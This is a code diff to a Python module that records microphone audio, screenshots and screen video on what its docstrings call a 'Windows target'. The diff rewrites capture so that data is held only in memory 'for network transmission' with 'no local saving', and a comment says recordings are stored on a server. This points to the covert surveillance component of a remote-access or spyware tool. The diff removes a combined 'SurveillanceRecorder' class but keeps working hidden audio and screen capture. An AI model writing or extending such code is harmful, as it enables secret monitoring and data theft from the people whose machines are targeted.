@@ -33,7 +33,7 @@ class AudioRecorder:
             os.makedirs(self.output_dir)
         print(f"Audio recorder initialized: {self.output_dir}")
     
-    def start_recording(self, duration=None, filename=None):
+    def start_audio_recording(self, duration=None, filename=None):
         """Start audio recording"""
         if self.is_recording:
             return False, "Already recording"
@@ -86,8 +86,22 @@ class AudioRecorder:
                 stream.close()
                 p.terminate()
                 
-                # Save the recorded data as a WAV file
-                self.save_audio()
+                # Prepare audio data for transmission (like video does)
+                try:
+                    import io
+                    audio_buffer = io.BytesIO()
+                    wf = wave.open(audio_buffer, 'wb')
+                    wf.setnchannels(self.channels)
+                    wf.setsampwidth(pyaudio.PyAudio().get_sample_size(self.sample_format))
+                    wf.setframerate(self.fs)
+                    wf.writeframes(b''.join(self.frames))
+                    wf.close()
+                    
+                    self.audio_data = audio_buffer.getvalue()
+                    print(f"Audio data prepared: {self.temp_filename} ({len(self.audio_data)} bytes)")
+                except Exception as prep_e:
+                    print(f"Error preparing audio data: {str(prep_e)}")
+                    self.audio_data = None
                 
             except Exception as e:
                 print(f"Audio recording error: {str(e)}")
@@ -96,10 +110,10 @@ class AudioRecorder:
         self.audio_thread = threading.Thread(target=record_audio, daemon=True)
         self.audio_thread.start()
         
-        return True, f"Audio recording started: {self.filename}"
+        return True, f"Audio recording started: {self.temp_filename}"
     
     def stop_recording(self):
-        """Stop audio recording"""
+        """Stop audio recording and return audio data"""
         if not self.is_recording:
             return False, "Not currently recording"
         
@@ -109,27 +123,13 @@ class AudioRecorder:
         if self.audio_thread:
             self.audio_thread.join(timeout=5)
         
-        return self.save_audio()
+        # Return audio data if available (like video does)
+        if hasattr(self, 'audio_data') and self.audio_data:
+            return True, {"filename": self.temp_filename, "data": self.audio_data, "size": len(self.audio_data)}
+        else:
+            return False, "No audio data available"
     
-    def save_audio(self):
-        """Convert recorded audio to WAV data for transmission"""
-        try:
-            import io
-            # Create WAV data in memory
-            audio_buffer = io.BytesIO()
-            wf = wave.open(audio_buffer, 'wb')
-            wf.setnchannels(self.channels)
-            wf.setsampwidth(pyaudio.PyAudio().get_sample_size(self.sample_format))
-            wf.setframerate(self.fs)
-            wf.writeframes(b''.join(self.frames))
-            wf.close()
-            
-            audio_data = audio_buffer.getvalue()
-            print(f"Audio data prepared: {self.temp_filename} ({len(audio_data)} bytes)")
-            return True, {"filename": self.temp_filename, "data": audio_data, "size": len(audio_data)}
-        except Exception as e:
-            print(f"Error preparing audio: {str(e)}")
-            return False, str(e)
+
     
     def get_audio_devices(self):
         """Get list of available audio input devices"""
@@ -171,7 +171,7 @@ class ScreenRecorder:
         print(f"Screen recorder initialized: {self.output_dir}")
     
     def take_screenshot(self, filename=None):
-        """Take a screenshot on Windows target and return image data"""
+        """Take a screenshot and prepare for transmission (no local saving)"""
         try:
             # Generate filename if not provided
             if filename is None:
@@ -181,13 +181,13 @@ class ScreenRecorder:
             # Take screenshot using PIL ImageGrab (Windows only)
             screenshot = ImageGrab.grab()
             
-            # Convert to bytes for network transmission
+            # Convert to bytes for network transmission only (no local saving)
             import io
             img_byte_arr = io.BytesIO()
             screenshot.save(img_byte_arr, format='PNG')
             img_data = img_byte_arr.getvalue()
             
-            print(f"Screenshot captured: {filename} ({len(img_data)} bytes)")
+            print(f"Screenshot captured for transmission: {filename} ({len(img_data)} bytes)")
             return True, {"filename": filename, "data": img_data, "size": len(img_data)}
             
         except Exception as e:
@@ -268,7 +268,7 @@ class ScreenRecorder:
         self.video_thread = threading.Thread(target=record_screen, daemon=True)
         self.video_thread.start()
         
-        return True, f"Screen recording started: {self.filename}"
+        return True, f"Screen recording started: {self.temp_filename}"
     
     def stop_screen_recording(self):
         """Stop screen recording and return video data"""
@@ -337,189 +337,38 @@ class ScreenRecorder:
         return windows
 
 
-class SurveillanceRecorder:
-    """Combined audio and video surveillance recorder for Windows target"""
-    
-    def __init__(self, output_dir="recordings"):
-        # Use absolute path to ensure proper file handling
-        self.output_dir = os.path.abspath(output_dir)
-        self.audio_recorder = AudioRecorder(self.output_dir)
-        self.screen_recorder = ScreenRecorder(self.output_dir)
-        self.surveillance_active = False
-        
-        # Ensure output directory exists
-        if not os.path.exists(self.output_dir):
-            os.makedirs(self.output_dir)
-        
-        print(f"Surveillance recorder initialized for Windows target: {self.output_dir}")
-    
-    def start_surveillance(self, duration=None, audio=True, video=True):
-        """Start combined audio and video surveillance"""
-        if self.surveillance_active:
-            return False, "Surveillance already active"
-        
-        results = []
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        
-        # Start audio recording
-        if audio:
-            try:
-                audio_success, audio_msg = self.audio_recorder.start_recording(
-                    duration=duration, 
-                    filename=f"surveillance_audio_{timestamp}.wav"
-                )
-                results.append(f"Audio: {audio_msg}")
-            except Exception as e:
-                results.append(f"Audio: Error - {str(e)}")
-        
-        # Start screen recording
-        if video:
-            try:
-                video_success, video_msg = self.screen_recorder.start_screen_recording(
-                    duration=duration,
-                    filename=f"surveillance_video_{timestamp}.avi"
-                )
-                results.append(f"Video: {video_msg}")
-            except Exception as e:
-                results.append(f"Video: Error - {str(e)}")
-        
-        self.surveillance_active = True
-        return True, " | ".join(results)
-    
-    def stop_surveillance(self):
-        """Stop all surveillance recording and return data"""
-        if not self.surveillance_active:
-            return False, "No surveillance active"
-        
-        result_data = {}
-        
-        # Stop audio recording and get data
-        if self.audio_recorder.is_recording:
-            audio_success, audio_result = self.audio_recorder.stop_recording()
-            if audio_success and isinstance(audio_result, dict):
-                result_data['audio_filename'] = audio_result['filename']
-                result_data['audio_data'] = audio_result['data']
-                result_data['audio_size'] = audio_result['size']
-        
-        # Stop screen recording and get data
-        if self.screen_recorder.is_recording:
-            video_success, video_result = self.screen_recorder.stop_screen_recording()
-            if video_success and isinstance(video_result, dict):
-                result_data['video_filename'] = video_result['filename']
-                result_data['video_data'] = video_result['data']
-                result_data['video_size'] = video_result['size']
-        
-        self.surveillance_active = False
-        
-        if result_data:
-            return True, result_data
-        else:
-            return True, "Recording stopped but no data available"
-    
-    def take_surveillance_snapshot(self):
-        """Take immediate screenshot and short audio sample"""
-        results = []
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        
-        # Take screenshot
-        screenshot_success, screenshot_msg = self.screen_recorder.take_screenshot(
-            filename=f"snapshot_{timestamp}.png"
-        )
-        results.append(f"Screenshot: {screenshot_msg}")
-        
-        # Record short audio sample (5 seconds)
-        try:
-            audio_success, audio_msg = self.audio_recorder.start_recording(
-                duration=5,
-                filename=f"snapshot_audio_{timestamp}.wav"
-            )
-            results.append(f"Audio: {audio_msg}")
-            
-            # Wait for audio to complete
-            time.sleep(6)
-        except Exception as e:
-            results.append(f"Audio: Error - {str(e)}")
-        
-        return True, " | ".join(results)
-    
-    def list_recordings(self):
-        """Recordings are stored on server, not locally"""
-        return "Recordings are stored on the server."
-    
-    def delete_recording(self, filename):
-        """Delete a specific recording"""
-        try:
-            filepath = os.path.join(self.output_dir, filename)
-            if os.path.exists(filepath):
-                os.remove(filepath)
-                return True, f"Deleted: {filename}"
-            else:
-                return False, f"File not found: {filename}"
-        except Exception as e:
-            return False, f"Error deleting {filename}: {str(e)}"
-    
-    def cleanup_old_recordings(self, days_old=7):
-        """Clean up recordings older than specified days"""
-        deleted_count = 0
-        
-        try:
-            if os.path.exists(self.output_dir):
-                current_time = time.time()
-                cutoff_time = current_time - (days_old * 24 * 60 * 60)
-                
-                for filename in os.listdir(self.output_dir):
-                    filepath = os.path.join(self.output_dir, filename)
-                    if os.path.isfile(filepath):
-                        file_time = os.path.getmtime(filepath)
-                        if file_time < cutoff_time:
-                            os.remove(filepath)
-                            deleted_count += 1
-        except Exception as e:
-            print(f"Error during cleanup: {str(e)}")
-        
-        return deleted_count
+# Factory functions to create individual recorders
+def create_audio_recorder(output_dir="recordings"):
+    """Create audio recorder instance"""
+    return AudioRecorder(output_dir)
+
+def create_screen_recorder(output_dir="recordings"):
+    """Create screen recorder instance"""
+    return ScreenRecorder(output_dir)
 
 
-# Factory function to create recorder
-def create_surveillance_recorder(output_dir="recordings"):
-    """Create surveillance recorder instance"""
-    return SurveillanceRecorder(output_dir)
-
-
-# Test the surveillance recorder
+# Test the individual recorders
 if __name__ == "__main__":
-    print("Testing Surveillance Recorder...")
+    print("Testing Audio and Screen Recorders...")
     
-    recorder = create_surveillance_recorder("test_recordings")
-    
-    # Show system status
-    status = recorder.get_system_status()
-    print(f"\nSystem Status:")
-    for key, value in status.items():
-        if key not in ['audio_devices', 'active_windows']:
-            print(f"  {key}: {value}")
+    audio_recorder = create_audio_recorder("test_recordings")
+    screen_recorder = create_screen_recorder("test_recordings")
     
     # Test screenshot
     print("\nTesting screenshot...")
-    success, msg = recorder.screen_recorder.take_screenshot()
+    success, msg = screen_recorder.take_screenshot()
     print(f"Screenshot: {msg}")
     
-    # Test short surveillance
-    print("\nTesting 10-second surveillance...")
-    success, msg = recorder.start_surveillance(duration=10, audio=True, video=True)
-    print(f"Start: {msg}")
+    # Test short audio recording
+    print("\nTesting 5-second audio recording...")
+    success, msg = audio_recorder.start_audio_recording(duration=5)
+    print(f"Audio start: {msg}")
     
     # Wait for completion
-    time.sleep(12)
+    time.sleep(6)
     
-    # Stop surveillance
-    success, msg = recorder.stop_surveillance()
-    print(f"Stop: {msg}")
+    # Stop audio
+    success, result = audio_recorder.stop_recording()
+    print(f"Audio stop: {result}")
     
-    # List recordings
-    recordings = recorder.list_recordings()
-    print(f"\nRecordings created:")
-    for recording in recordings:
-        print(f"  - {recording['filename']} ({recording['size']} bytes)")
-    
-    print("\nSurveillance test completed!")
+    print("\nRecorder test completed!")
